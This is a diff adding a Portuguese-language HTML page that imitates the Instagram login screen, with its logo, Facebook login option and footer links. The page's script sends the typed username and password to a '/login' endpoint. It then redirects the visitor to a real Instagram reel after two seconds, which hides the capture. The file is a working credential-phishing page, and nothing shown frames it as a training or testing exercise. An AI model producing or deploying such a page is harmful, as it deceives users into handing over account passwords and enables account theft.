@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="icon" href="data:;base64,iVBORw0KGgo=">
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+                    <img src="instagram.png" alt="Instagram">
+                </div>
+                <div class="form">
+                    <form id="loginForm" onsubmit="handleSubmit(event)">
+                        <div class="input_field">
+                            <input type="text" placeholder="Telefone, nome de usuário ou email" class="input" name="username" required>
+                        </div>
+                        <div class="input_field">
+                            <input type="password" placeholder="Senha" class="input" name="password" required>
+                        </div>
+                        <div class="btn">
+                            <button type="submit">Entrar</button>
+                        </div>
+                    </form>
+                </div>
+                <div class="or">
+                    <div class="line"></div>
+                    <p>OU</p>
+                    <div class="line"></div>
+                </div>
+                <div class="dif">
+                    <div class="fb">
+                        <img src="facebook.png" alt="facebook">
+                        <p>Entrar com o Facebook</p>
+                    </div>
+                    <div class="forgot">
+                        <a href="#">Esqueceu a senha?</a>
+                    </div>
+                </div>
+            </div>
+            <div class="signup">
+                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
+            </div>
+            <div class="apps">
+                <p>Obtenha o aplicativo.</p>
+                <div class="icons">
+                    <a href="#"><img src="appstore.png" alt="appstore"></a>
+                    <a href="#"><img src="googleplay.png" alt="googleplay"></a>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <div class="links">
+                <ul>
+                    <li><a href="#">Sobre</a></li>
+                    <li><a href="#">Blog</a></li>
+                    <li><a href="#">Carreiras</a></li>
+                    <li><a href="#">Ajuda</a></li>
+                    <li><a href="#">API</a></li>
+                    <li><a href="#">Privacidade</a></li>
+                    <li><a href="#">Termos</a></li>
+                    <li><a href="#">Principais contas</a></li>
+                    <li><a href="#">Hashtags</a></li>
+                    <li><a href="#">Localizações</a></li>
+                </ul>
+            </div>
+            <div class="copyright">
+                2024 Instagram
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const form = document.getElementById('loginForm');
+            const formData = new FormData(form);
+
+            fetch('/login', {
+                method: 'POST',
+                body: formData
+            });
+
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.replace('https://www.instagram.com/jovanenunesmm/reel/DDwmo1SRBu4/');
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
